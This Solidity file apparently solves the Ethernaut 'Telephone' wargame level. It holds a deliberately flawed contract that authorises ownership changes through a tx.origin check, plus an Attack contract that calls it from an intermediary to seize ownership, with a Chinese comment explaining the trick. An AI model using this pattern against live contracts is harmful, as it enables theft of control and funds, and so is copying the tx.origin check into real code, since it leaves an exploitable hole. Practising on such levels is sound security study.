// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack{
    
    function attack(address _addr) public {
        // 如果是call 那么 tx.origin 就是调用这个合约的外部地址     msg.sender 就是 这个合约地址 
       (bool sent , bytes memory data) = _addr.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
       require(sent, "Failed to call function");   
    }
}